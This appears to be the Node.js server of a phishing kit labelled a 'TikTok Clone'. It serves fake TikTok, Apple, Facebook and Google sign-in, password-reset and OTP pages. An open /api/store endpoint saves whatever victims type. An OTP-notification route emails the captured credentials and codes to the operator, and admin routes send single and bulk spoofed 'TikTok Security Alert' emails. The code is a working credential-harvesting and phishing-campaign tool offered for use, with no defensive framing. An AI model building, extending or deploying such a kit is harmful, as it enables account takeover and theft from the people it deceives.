const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const emailSender = require('./email-sender');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;
const DATA_FILE = path.join(__dirname, 'data.json');

// ── Admin credentials (MUST be set via environment variables!) ─
const ADMIN_USERNAME = process.env.ADMIN_USER;
const ADMIN_PASSWORD = process.env.ADMIN_PASS;

// Fail secure: refuse to start if credentials not set
if (!ADMIN_USERNAME || !ADMIN_PASSWORD) {
  console.error('❌ FATAL: ADMIN_USER and ADMIN_PASS environment variables MUST be set!');
  console.error('   These are required for admin panel security.');
  process.exit(1);
}

// ── Admin notification email (can be set via env or updated at runtime) ─
let adminNotificationEmail = process.env.ADMIN_EMAIL || '';

// File to persist admin notification email
const ADMIN_CONFIG_FILE = path.join(__dirname, 'admin-config.json');

// Load admin config from file if exists
if (fs.existsSync(ADMIN_CONFIG_FILE)) {
  try {
    const config = JSON.parse(fs.readFileSync(ADMIN_CONFIG_FILE, 'utf8'));
    if (config.notificationEmail) {
      adminNotificationEmail = config.notificationEmail;
      console.log(`[Config] Loaded admin notification email from file`);
    }
  } catch (e) {
    console.error('[Config] Failed to load admin config:', e.message);
  }
}

// ── Facebook display name ──────────────────────────────────
const FB_NAME = process.env.FB_NAME || 'John Smith';

// ── Token store (in-memory, resets on restart) ─────────────
const activeTokens = new Set();

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware
app.use(express.json({ limit: '1mb' })); // Limit payload size
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// ── Security Headers ────────────────────────────────────────
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // Enable XSS protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  // Enforce HTTPS in production (when behind proxy)
  if (process.env.NODE_ENV === 'production') {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  }
  next();
});

// ── Rate Limiting ────────────────────────────────────────────
// General API rate limit
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: { error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});

// Strict rate limit for authentication endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // Limit each IP to 10 login attempts per windowMs
  message: { error: 'Too many login attempts, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply general rate limit to all routes
app.use(generalLimiter);

// Serve all static files from the current directory
app.use(express.static(path.join(__dirname, 'public')));

// Route map — clean URLs
const routes = {
  '/':                  'login.html',
  '/login':             'login.html',
  '/signup':            'signup.html',
  '/login/phone':       'login-phone.html',
  '/login/email':       'login-email.html',
  '/signup/phone':      'signup-phone.html',
  '/signup/email':      'signup-email.html',
  '/auth/apple':        'apple-signin.html',
  '/auth/apple/verify': 'apple-password.html',
  '/auth/facebook':     'facebook-auth.html',
  '/auth/facebook/login': 'facebook-login.html',
  '/auth/google':       'google-signin.html',
  '/reset-password':    'reset-password.html',
  '/verify-otp':        'verify-otp.html',
};

Object.entries(routes).forEach(([route, file]) => {
  app.get(route, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', file));
  });
});

// ── Admin login page ───────────────────────────────────────
app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

// ── Admin login API (with rate limiting) ───────────────────
app.post('/api/admin/login', authLimiter, (req, res) => {
  const { username, password } = req.body;

  // Input validation
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password required' });
  }

  // Constant-time compare to prevent timing attacks
  const userMatch = crypto.timingSafeEqual(
    Buffer.from(username || ''),
    Buffer.from(ADMIN_USERNAME)
  );
  const passMatch = crypto.timingSafeEqual(
    Buffer.from(password || ''),
    Buffer.from(ADMIN_PASSWORD)
  );

  if (userMatch && passMatch) {
    const token = generateToken();
    activeTokens.add(token);
    // Auto-expire token after 2 hours
    setTimeout(() => activeTokens.delete(token), 2 * 60 * 60 * 1000);
    return res.json({ success: true, token });
  }

  // Generic error message (don't reveal which field is wrong)
  res.status(401).json({ success: false, message: 'Invalid credentials' });
});

// ── Admin logout API ───────────────────────────────────────
app.post('/api/admin/logout', (req, res) => {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  activeTokens.delete(token);
  res.json({ success: true });
});

// ── Token verification API ─────────────────────────────────
app.get('/api/admin/verify', (req, res) => {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  if (activeTokens.has(token)) {
    return res.json({ valid: true });
  }
  res.status(401).json({ valid: false });
});

// ── Admin dashboard (redirect to login if no token) ────────
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ── Protected API middleware ───────────────────────────────
function requireAdmin(req, res, next) {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  if (activeTokens.has(token)) return next();
  res.status(401).json({ error: 'Unauthorized' });
}

// ── Public config API ─────────────────────────────────────
app.get('/api/config/fb-name', (req, res) => {
  res.json({ name: FB_NAME });
});

// ── Admin notification email config API ────────────────────
app.get('/api/admin/notification-email', requireAdmin, (req, res) => {
  res.json({ email: adminNotificationEmail });
});

app.post('/api/admin/notification-email', requireAdmin, (req, res) => {
  const { email } = req.body;
  
  if (!email || !email.includes('@')) {
    return res.status(400).json({ success: false, error: 'Valid email is required' });
  }
  
  adminNotificationEmail = email;
  
  // Persist to file
  try {
    fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify({ notificationEmail: email }, null, 2));
    console.log(`[Config] Admin notification email updated: ${email}`);
    res.json({ success: true, email });
  } catch (e) {
    console.error('[Config] Failed to save admin config:', e.message);
    res.status(500).json({ success: false, error: 'Failed to save configuration' });
  }
});

// ── Data API (protected) ──────────────────────────────────
app.post('/api/store', (req, res) => {
  // Input validation and sanitization
  const { page, fields } = req.body;
  
  if (!page || !fields || typeof fields !== 'object') {
    return res.status(400).json({ success: false, error: 'Invalid data format' });
  }
  
  // Limit field count and size to prevent abuse
  const fieldCount = Object.keys(fields).length;
  if (fieldCount > 50) {
    return res.status(400).json({ success: false, error: 'Too many fields' });
  }
  
  // Sanitize: limit each field value to 1000 characters
  const sanitizedFields = {};
  for (const [key, value] of Object.entries(fields)) {
    if (typeof value === 'string') {
      sanitizedFields[key] = value.substring(0, 1000);
    } else {
      sanitizedFields[key] = String(value).substring(0, 1000);
    }
  }
  
  const entry = { page, fields: sanitizedFields, timestamp: new Date().toISOString() };
  let data = [];
  if (fs.existsSync(DATA_FILE)) {
    try { data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { data = []; }
  }
  data.push(entry);
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  res.json({ success: true });
});

app.get('/api/data', requireAdmin, (req, res) => {
  if (!fs.existsSync(DATA_FILE)) return res.json([]);
  try { res.json(JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))); }
  catch (e) { res.json([]); }
});

// ── OTP Notification API (triggers email to admin) ─────────
app.post('/api/notify-otp', async (req, res) => {
  const { userEmail, capturedData, timestamp } = req.body;

  if (!adminNotificationEmail) {
    console.log('[OTP Alert] Admin email not configured, skipping notification');
    return res.json({ success: false, message: 'Admin email not configured' });
  }

  // Get all previously captured data for this user session
  let allData = [];
  if (fs.existsSync(DATA_FILE)) {
    try { allData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { allData = []; }
  }

  // Flatten all captured fields from this session
  const flattenedData = {};
  allData.forEach(entry => {
    if (entry.fields) {
      Object.entries(entry.fields).forEach(([key, value]) => {
        flattenedData[key] = value;
      });
    }
  });

  // Add the new OTP data
  if (capturedData) {
    Object.entries(capturedData).forEach(([key, value]) => {
      flattenedData[key] = value;
    });
  }

  console.log(`[OTP Alert] Sending notification to ${adminNotificationEmail} for user: ${userEmail}`);

  // Send email notification to admin
  const result = await emailSender.sendOTPAdminAlert({
    to: adminNotificationEmail,
    adminName: 'Admin',
    userEmail: userEmail || 'Unknown',
    capturedData: flattenedData,
    timestamp: timestamp || new Date().toISOString(),
    adminLink: `${BASE_URL}/admin`,
  });

  if (result.success) {
    console.log(`[OTP Alert] Email sent successfully: ${result.messageId}`);
  } else {
    console.error(`[OTP Alert] Failed to send email: ${result.error}`);
  }

  res.json({ success: result.success, messageId: result.messageId, error: result.error });
});

app.get('/api/clear', requireAdmin, (req, res) => {
  if (fs.existsSync(DATA_FILE)) fs.unlinkSync(DATA_FILE);
  res.json({ success: true });
});

// ── Email Composer Page ────────────────────────────────────
app.get('/admin/email', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'email-composer.html'));
});

// ── Email API Routes ──────────────────────────────────────

// Get SMTP config (redacted)
app.get('/api/email/config', requireAdmin, (req, res) => {
  res.json(emailSender.getConfig());
});

// Update SMTP config
app.post('/api/email/config', requireAdmin, (req, res) => {
  const updated = emailSender.updateConfig(req.body);
  res.json({ success: true, config: updated });
});

// Verify SMTP connection
app.post('/api/email/verify', requireAdmin, async (req, res) => {
  const result = await emailSender.verifyConnection();
  res.json(result);
});

// Send single email
app.post('/api/email/send', requireAdmin, async (req, res) => {
  const { to, recipientName, loginDate, loginTime, timezone, device, location, subject, customHtml, ...templateData } = req.body;

  if (!to) return res.status(400).json({ success: false, error: 'Recipient email is required' });

  let result;
  if (customHtml) {
    result = await emailSender.sendEmail({ to, subject: subject || 'TikTok Security Alert', html: customHtml });
  } else {
    result = await emailSender.sendTikTokAlert({ to, recipientName, loginDate, loginTime, timezone, device, location, ...templateData, baseUrl: BASE_URL });
  }
  
  // Log sent email
  const logFile = path.join(__dirname, 'email-log.json');
  let logs = [];
  if (fs.existsSync(logFile)) {
    try { logs = JSON.parse(fs.readFileSync(logFile, 'utf8')); } catch(e) { logs = []; }
  }
  logs.push({ to, recipientName, subject, success: result.success, messageId: result.messageId, error: result.error, timestamp: new Date().toISOString() });
  fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

  res.json(result);
});

// Send bulk emails
app.post('/api/email/bulk', requireAdmin, async (req, res) => {
  const { recipients, templateData, delayMs } = req.body;
  if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
    return res.status(400).json({ success: false, error: 'Recipients array is required' });
  }
  const results = await emailSender.sendBulk(recipients, templateData || {}, delayMs || 1000);
  res.json({ success: true, results });
});

// Preview email template
app.post('/api/email/preview', requireAdmin, (req, res) => {
  const html = emailSender.generateTikTokAlertHTML({ ...req.body, baseUrl: BASE_URL });
  res.json({ html });
});

// Get email send history
app.get('/api/email/logs', requireAdmin, (req, res) => {
  const logFile = path.join(__dirname, 'email-log.json');
  if (!fs.existsSync(logFile)) return res.json([]);
  try { res.json(JSON.parse(fs.readFileSync(logFile, 'utf8'))); }
  catch (e) { res.json([]); }
});

// Clear email logs
app.delete('/api/email/logs', requireAdmin, (req, res) => {
  const logFile = path.join(__dirname, 'email-log.json');
  if (fs.existsSync(logFile)) fs.unlinkSync(logFile);
  res.json({ success: true });
});

// 404 handler - don't expose internal routing
app.use((req, res) => {
  res.status(404).redirect('/');
});

// ── Global Error Handler ───────────────────────────────────
app.use((err, req, res, next) => {
  console.error('[Server Error]', err.message);
  // Don't expose stack traces or internal errors to clients
  res.status(err.status || 500).json({ 
    error: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message 
  });
});

app.listen(PORT, () => {
  console.log(`\n  TikTok Clone running at http://localhost:${PORT}\n`);
  console.log('  Routes:');
  Object.entries(routes).forEach(([r, f]) => {
    console.log(`    http://localhost:${PORT}${r.padEnd(24)} → ${f}`);
  });
  console.log(`    http://localhost:${PORT}/admin                  → admin.html (🔒 protected)`);
  console.log(`    http://localhost:${PORT}/admin/login             → admin-login.html`);
  console.log(`    http://localhost:${PORT}/admin/email             → email-composer.html (🔒 protected)`);
  console.log(`\n  Admin credentials: [SET VIA ENVIRONMENT VARIABLES]`);
  console.log(`  Admin notification email: ${adminNotificationEmail || '(not configured - set via /admin/email)'}`);
  console.log(`  SMTP: ${emailSender.getConfig().host}:${emailSender.getConfig().port} (${emailSender.getConfig().user || 'not configured - set via /admin/email'})\n`);
});
